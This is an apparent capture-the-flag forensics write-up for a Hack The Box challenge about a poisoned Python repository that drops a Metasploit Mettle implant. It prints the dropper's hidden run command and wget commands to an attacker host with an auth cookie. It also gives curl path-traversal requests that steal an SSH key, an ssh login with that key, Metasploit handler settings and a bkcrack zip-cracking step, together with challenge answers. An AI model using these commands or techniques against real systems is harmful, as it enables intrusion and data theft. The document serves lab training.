# HTB Sherlock: Poisoned Branch (Holmes CTF 2026, Sherlock 05)

**Status:** Q1 to Q6 confirmed. Q7 to Q15 still open, and the next steps for them are at the bottom.

**Scenario in one paragraph:** Tom Ainsworth supports an emergency HR application. He installed a "useful-looking" public repository, and his workstation started acting strange. Lestrade preserved his machine and we got two things to work with: `Tom.zip` (his home directory) and a UAC live-response collection from his laptop (`uac-LT-TAinsworth-linux-20260915155349`). The job is to work out what the repo installed and where the intruder went afterwards.

---

## Artifacts

| Artifact | What it is |
|---|---|
| `Tom.zip` | Tom's home directory: `Projects/`, `.cache/`, `.ssh/`, `.bashrc`, `.bash_history` and so on |
| `uac_output/uac-...tar.gz` | UAC collection (`live_response/`, `[root]/`, `bodyfile/`, `hash_executables/`) |
| The PDF | Story chapters only, nothing technical |

### Gotchas that cost me time

- The UAC tarball extracts flat into `uac/`, so there's no wrapper folder.
- `[root]` is a bash glob, so always quote it: `'[root]'/var/log/audit`.
- `tree` hides dotfiles. Things like `.cache/.ticket-parser/` and `.bash_history` won't show up in it, so use `ls -la` or `find`.
- The `.bash_history` in the zip was extracted as a stored, empty file. The attacker's commands aren't going to be there.

---

## Step 1: Which project is the bad one?

Tom's `Projects/` folder has five repos:

| Repo | Verdict |
|---|---|
| `dlt`, `json-to-csv`, `csvtomd` | Well-known public open-source projects, just noise |
| `diogenes-breakroom-roster` | Small internal-looking tool, looks like a decoy |
| `diogenes-ticket-parser` | The suspicious one: it has a `.bin` blob, an image, and files named `telemetry.py` and `runtime_checks.py` |

Its README also has a giveaway note:

> This package performs a lightweight integrity check during startup to ensure parser resources are available.

That "integrity check" is the cover story for the backdoor, and you'll see why in Step 3.

### Q1: Name of the malicious repository

Command:

```bash
cd home/Tom/Projects/diogenes-ticket-parser
cat .git/config | grep -i url
```

Output:

```
url = http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git
```

**Answer: `diogenes-ticket-parser`**

One more oddity: the README tells users to clone from `github.com/diogenes-support/diogenes-ticket-parser.git`, but Tom's actual remote is an internal Gitea-style server (`devforge.internal:3000`). The README and the real origin don't match.

---

## Step 2: Who authored it?

### Q2: Author email

Command:

```bash
git log --all --format='%H | %an <%ae> | %ad | %s'
```

Output:

```
81d8e7448c185be0733d8cab67b40a2e572fd91e | Sebastain Moran <cbass.Moran@blackpearl2026.htb> | Fri Sep 11 16:05:06 2026 +0100 | Initial project import
```

**Answer: `cbass.Moran@blackpearl2026.htb`**

The whole repo is a single "Initial project import" commit from Sep 11, four days before the UAC collection on Sep 15. The chapter title "Moran's Door" lines up with the author name.

---

## Step 3: How does the repo drop the implant?

### Q3: File holding the encrypted payload

Command:

```bash
grep -rnE "calibration|\.bin|decrypt|AES|Fernet|xor|exec\(|base64" . --include=*.py
```

Only `src/ticket_parser/telemetry.py` matched. Reading it, `validate_environment()` does this:

1. Reads two files that sit next to it: `diogenes.jpg` and `calibration.bin`.
2. Passes them to a function called `repeating()`, which XORs the longer file against the shorter one on a repeating key.
3. Base64-decodes three path components:

   | Encoded | Decoded |
   |---|---|
   | `LmNhY2hl` | `.cache` |
   | `LnRpY2tldC1wYXJzZXI=` | `.ticket-parser` |
   | `LmludGVncml0eQ==` | `.integrity` |

4. Writes the XOR result to `~/.cache/.ticket-parser/.integrity`.
5. Base64-decodes `_CALIBRATION` and runs it with `shell=True`, hiding stdout and stderr:

   ```
   chmod +x ~/.cache/.ticket-parser/.integrity; ~/.cache/.ticket-parser/.integrity 2>&1 &
   ```

So the payload is stored as `calibration.bin` (XOR key material, effectively the encrypted payload) plus an innocent-looking JPEG. Neither is an executable on its own, which is why static scanners would skip them. `file calibration.bin` just says `data`, and the hex dump starts like a broken JPEG.

The other modules (`runtime_checks.py`, `output_helpers.py`, `parser.py`) are filler. They have odd names and comments but nothing malicious.

**Answer: `calibration.bin`**

### Confirming what it built

The rebuilt file is already in the zip at `home/Tom/.cache/.ticket-parser/.integrity`:

```bash
file .integrity
# ELF 64-bit LSB pie executable, x86-64, static-pie linked, with debug_info, not stripped

strings -a .integrity | grep -Ei "http|cookie|mettle"
```

The strings include this build path:

```
/home/jenkins/agent/workspace/mettle_build_gem/mettle/mettle/src/http_client.c
```

That's **Mettle**, the Metasploit Linux meterpreter payload, with an HTTP(S) client, cookie handling and a shell fallback (`/usr/local/bin/bash`, `/system/bin/sh`). So the "integrity check" is really a C2 implant.

---

## Step 4: Find the running implant in the UAC data

### Q4: Full path of the C2 implant

Command (from inside `uac/`):

```bash
grep -R "\.integrity" live_response/process/ | head
```

Every source agrees:

```
live_response/process/proc/1514/cmdline.txt : /home/Tom/.cache/.ticket-parser/.integrity
live_response/process/ps_auxwww.txt         : Tom  1514 ... /home/Tom/.cache/.ticket-parser/.integrity
live_response/process/ls_-l_proc.txt        : exe -> /home/Tom/.cache/.ticket-parser/.integrity
```

**Answer: `/home/Tom/.cache/.ticket-parser/.integrity`**

### Q6: PID of the implant

```
live_response/process/ps_-axo_pid_user_lstart_args.txt:
   1514 Tom      Tue Sep 15 15:20:20 2026 /home/Tom/.cache/.ticket-parser/.integrity
```

It's running as user `Tom` on `tty1`, started at 15:20:20. The elapsed time of 33:29 in `ps_-axo_pid_user_etime_args.txt` lands right on the UAC collection time of about 15:53, so it was still alive when the laptop was acquired.

**Answer: `1514`**

(For context, `proc/1514/stat.txt` shows the PPID is `1`, so it daemonized. Q10 asks about a different process, so don't reuse this number for it.)

### Q5: Port the implant connected back to

Command:

```bash
grep -iE "integrity" live_response/network/*
```

Output:

```
ss_-tanp.txt: ESTAB 0 0 192.168.0.21:50878 203.0.113.10:31337 users:((".integrity",pid=1514,fd=4))
```

The same line shows up in `ss_-anp.txt`, `ss_-ap.txt` and `ss_-tap.txt`. It's an established TCP session from Tom's laptop (`192.168.0.21`) to the attacker at `203.0.113.10` on port `31337`, owned by PID 1514.

**Answer: `31337`**

---

## Answer summary (confirmed)

| Q | Question | Answer |
|---|---|---|
| 1 | Malicious repository name | `diogenes-ticket-parser` |
| 2 | Author email | `cbass.Moran@blackpearl2026.htb` |
| 3 | File holding the encrypted payload | `calibration.bin` |
| 4 | Full path of the C2 implant | `/home/Tom/.cache/.ticket-parser/.integrity` |
| 5 | Port the implant connected to | `31337` |
| 6 | PID of the implant | `1514` |

## Attack chain so far

```
Sebastain Moran publishes diogenes-ticket-parser (Sep 11)
        |
Tom clones it from devforge.internal:3000 and runs it
        |
telemetry.validate_environment(): diogenes.jpg XOR calibration.bin
        |
writes ~/.cache/.ticket-parser/.integrity   (Mettle ELF)
        |
chmod +x and run in the background (PID 1514, 15:20:20)
        |
reverse connection 192.168.0.21 -> 203.0.113.10:31337
```

---

## Still open (Q7 to Q15)

Not answered yet, because none of this has been seen in the data so far. These are the places to dig.

| Q | What to find | Where to look |
|---|---|---|
| 7 | Failed `URL:PORT` download, then `IP:PORT` | auditd `EXECVE` records for `curl`/`wget`, journal, bodyfile; the URL:PORT is what goes in `/etc/hosts` |
| 8 | Attacker web server cookie/token (`Header=value`) | The same download command (`-H`, `-b`, `--cookie`), or its HTTP requests |
| 9 | Deletion command | `EXECVE` for `rm`/`shred`/`unlink` |
| 10 | PPID of that deletion command | The `SYSCALL` record on the same audit event (`ppid=`) |
| 11 | Command declaring the implant architecture | Listener setup, probably a `set arch`-style command, so check audit/journal and any leftover attacker files |
| 12 | Command locating a directory/file combo | `find`/`ls`/`locate` in the audit log |
| 13 | File holding the exfiltrated documents | Archive or staging file, via `bodyfile` and audit `tar`/`zip`/`cp` |
| 14 | Person with a redacted position | Text inside the exfiltrated documents |
| 15 | That person's address | Same document set |

Starting commands, run from `PoisonedBranch/`:

```bash
cd uac_output/uac/'[root]'/var/log/audit
ls -la

# Everything spawned by the implant (children of PID 1514)
ausearch -if audit.log -i -p 1514 2>/dev/null | less -S
grep -a "ppid=1514" audit.log* | head -50

# Keyword hunts
grep -aiE "curl|wget|http|cookie|token|--header|-H |-b " audit.log*      # Q7, Q8
grep -aiE "\brm\b|shred|unlink|srm" audit.log*                           # Q9, Q10
grep -aiE "arch|x64|x86|msfvenom|msfconsole|set " audit.log*             # Q11
grep -aiE "find |locate|whereis" audit.log*                              # Q12
grep -aiE "tar |zip|7z|cp |mv " audit.log*                               # Q13
```

If the audit logs come up short, fall back to the other UAC sources:

```bash
cd ../../../..   # back into uac/
strings -a '[root]'/var/log/journal/*/* | grep -aiE "curl|wget|cookie|203.0.113"
grep -aE "Sep 15|09/15" bodyfile/* | grep -aiE "tmp|dev/shm|\.cache|Tom" | head -60
grep -a "deleted" live_response/process/lsof_-nPl.txt
grep -rIaiE "LHOST|LPORT|set arch|set payload|redacted|position" . | head -40
```

# Poisoned Branch — Answers Q7 to Q15

## Q7 — URL:PORT the attacker tried before falling back to IP:PORT

**Answer:** `BlackPearl2026.htb:9999`

**Evidence:** In `[root]/var/log/audit/audit.log`, two `wget` EXECVE records were captured. Several arguments were logged as hex because they contained special characters. Decoding them:

```
type=EXECVE msg=audit(1789482400.268:366): a0="wget" a1="-q"
  a2=(hex) --header=Cookie: X-Operator-Auth=napoleon_moran_1894
  a3="-O" a4="authorized_keys"
  a5=(hex) http://BlackPearl2026.htb:9999/download?file=../../.ssh/id_rsa.pub

type=EXECVE msg=audit(1789482890.524:369): a0="wget" a1="-q"
  a2=(hex) --header=Cookie: X-Operator-Auth=napoleon_moran_1894
  a3="-O" a4="authorized_keys"
  a5="http://203.0.113.10:9999/download?file=../../.ssh/id_rsa.pub"
```

The first attempt (pid 1520) used the hostname `BlackPearl2026.htb:9999`, which failed to resolve on Tom's box. The retry ~8 minutes later (pid 1528) used the raw IP `203.0.113.10:9999` instead.

**How to solve:**
1. Extract UAC tarball, locate `audit.log` under `[root]/var/log/audit/`.
2. `grep -a 'a0="wget"' audit.log` to find both wget calls.
3. Any argument shown as a long hex string (not `"..."`) needs decoding: `echo <hex> | xxd -r -p`.
4. Compare timestamps/order — the hostname attempt comes first, the IP comes second.

---

## Q8 — Name of the Cookie/Token for the attacker's web server

**Answer:** `X-Operator-Auth=napoleon_moran_1894`

**Evidence:** Same two `wget` EXECVE records as Q7. The `a2` hex argument decodes to:
```
--header=Cookie: X-Operator-Auth=napoleon_moran_1894
```
This was later confirmed live: the Flask server's source (`app.py`, pulled via LFI) explicitly checks:
```python
COOKIE_NAME = "X-Operator-Auth"
COOKIE_VALUE = "napoleon_moran_1894"
```

**How to solve:** Decode the same hex blob from Q7's audit records; the cookie name/value pair is embedded in the `--header` argument.

---

## Q9 — Command the attacker used to delete a file before leaving

**Answer:** `rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf`

**Evidence:**
```
type=EXECVE msg=audit(1789483257.580:381): argc=2 a0="rm" a1="Gov_HR_Continuity_Emergency_Callout_Roster.pdf"
```

**How to solve:** `grep -a 'a0="rm"' audit.log` — only one `rm` EXECVE record exists in the log.

---

## Q10 — PPID of the delete command

**Answer:** `1549`

**Evidence:** The matching SYSCALL record for the same event:
```
type=SYSCALL msg=audit(1789483257.580:381): ... ppid=1549 pid=1551 ... comm="rm" exe="/usr/bin/rm" ...
```
Pid 1551 (`rm`) has `ppid=1549`. Pid 1549 is itself a `/bin/sh` spawned as a child of the implant process (pid 1514), confirmed by cross-referencing `ppid=1514` records in the same log — pid 1549 shows up there as one of several shells the implant launched over time.

**How to solve:** Find the SYSCALL line adjacent to the `rm` EXECVE line (same audit event ID, e.g. `:381`), read the `ppid=` field.

---

## Q11 — Command declaring the implant's architecture while preparing the listener

**Answer:** `set payload linux/x64/meterpreter_reverse_tcp`

**Evidence:** Retrieved from the attacker's own Metasploit console history (`~/.msf4/history`) via the Flask server's path-traversal LFI (`/download?file=../../.msf4/history`, authenticated with the cookie from Q8):
```
use exploit/multi/handler
set lport 31337
set lhost blackpearl2026.htb
set payload linux/x64/meterpreter_reverse_tcp
run
```
This is the only line in the handler setup that declares an architecture (`x64`), matching the implant confirmed to be x86_64 (per the audit log's `ARCH=x86_64` field on every implant-spawned process).

**How to solve:**
1. Note the wget target from Q7/Q8 exposes a Flask file server with `GET /download?file=<name>` and no path sanitization beyond `PUBLIC_DIR / requested_file` — vulnerable to `../` traversal.
2. Add the box IP to `/etc/hosts` as `BlackPearl2026.htb`.
3. `curl -H "Cookie: X-Operator-Auth=napoleon_moran_1894" "http://BlackPearl2026.htb:9999/download?file=../../.msf4/history"`
4. Read the `set payload` line.

---

## Q12 — Command the attacker ran to locate a specific directory and file combo

**Answer:** `search -d ONBOARDING -f *.pdf`

**Evidence:** Same `~/.msf4/meterpreter_history` file, fetched the same way:
```
search -h
search -d ONBOARDING
search -d ONBOARDING -f *.pdf
search -f *.pdf
```
Only the second `search` invocation specifies **both** a directory (`-d ONBOARDING`) and a file pattern (`-f *.pdf`), matching the question's "directory and file combo" wording.

**How to solve:**
1. `curl -H "Cookie: X-Operator-Auth=napoleon_moran_1894" "http://BlackPearl2026.htb:9999/download?file=../../.msf4/meterpreter_history"`
2. Identify the `search` line that includes both `-d` and `-f` flags.

---

## Q13 — Name of the file the attacker is keeping the exfiltrated documents in

**Answer:** `LOOT.zip`

**Evidence:** Obtained SSH access to `moran@BlackPearl2026.htb` using the private key exfiltrated via the same LFI bug (`/download?file=../../.ssh/id_rsa`). Directory listing:
```
moran@BlackPearl:~$ ls -la Exfiltrated_Loot/
-rw-r--r-- 1 moran moran 38934 Sep 15 15:43 LOOT.zip
-rw-r--r-- 1 moran moran    83 Sep 13 18:41 README.txt
```
`app.py` (Flask source, also pulled via LFI) confirms `UPLOAD_DIR = MORAN_HOME / "Exfiltrated_Loot"` is where uploaded/exfiltrated files land. `README.txt` inside the operator's home states: *"Upon exfiltration of loot. Package into a password protected zip. Remove remnants."* — matching the presence of a single password-protected zip in that folder.

**How to solve:**
1. Fetch `.ssh/id_rsa` via the LFI: `curl -H "Cookie: ..." "http://BlackPearl2026.htb:9999/download?file=../../.ssh/id_rsa" -o found_id_rsa`
2. `chmod 600 found_id_rsa`
3. `ssh -i found_id_rsa -o IdentitiesOnly=yes moran@BlackPearl2026.htb`
4. `ls -la Exfiltrated_Loot/`

---

## Q14 — Name of the person with their position redacted

## Q15 — Address of that person

**Status: NOT YET SOLVED.**

**What we know:**
- `LOOT.zip` contains three password-protected entries:
  ```
  cvoss_exfil                                    (41 bytes, stored)
  Gov_HR_Continuity_Emergency_Callout_Roster.pdf (78,587 bytes, deflated)
  README.txt                                     (83 bytes, deflated)
  ```
- The PDF is almost certainly where the redacted name/position/address live, based on the challenge PDF's narrative (Chapter 07 references an HR application serving "ordinary administrative data beside people close to sensitive work").
- The zip password has **not** been recovered. Wordlist attacks with John (`rockyou.txt`, custom lists of case names/keywords from this investigation, with and without mangling rules) all failed.
- A known-plaintext attack via `bkcrack` was in progress at time of writing: using the standard PDF header (`%PDF-1.4\n%\xe2\xe3\xcf\xd3\n`) as 12+ bytes of known plaintext against the encrypted PDF entry. This method does not require guessing the password — it recovers the internal cipher keys directly from known plaintext bytes, then decrypts the whole archive.

**Next steps once the zip is opened:**
```bash
bkcrack -C LOOT.zip -k <key0> <key1> <key2> -U decrypted.zip anypassword
unzip decrypted.zip -d loot_final
pdftotext -layout loot_final/Gov_HR_Continuity_Emergency_Callout_Roster.pdf - | less
```
Search the extracted text for the entry whose position/title field is blank, redacted, or marked (e.g. `[REDACTED]`). That entry's name answers Q14, and the address field in the same record answers Q15.

**This file should be updated with the final Q14/Q15 answers and evidence once the archive is decrypted.**

---

## Summary Table

| Q | Answer |
|---|---|
| 7 | `BlackPearl2026.htb:9999` |
| 8 | `X-Operator-Auth=napoleon_moran_1894` |
| 9 | `rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf` |
| 10 | `1549` |
| 11 | `set payload linux/x64/meterpreter_reverse_tcp` |
| 12 | `search -d ONBOARDING -f *.pdf` |
| 13 | `LOOT.zip` |
| 14 | *pending — zip not yet decrypted* |
| 15 | *pending — zip not yet decrypted* |
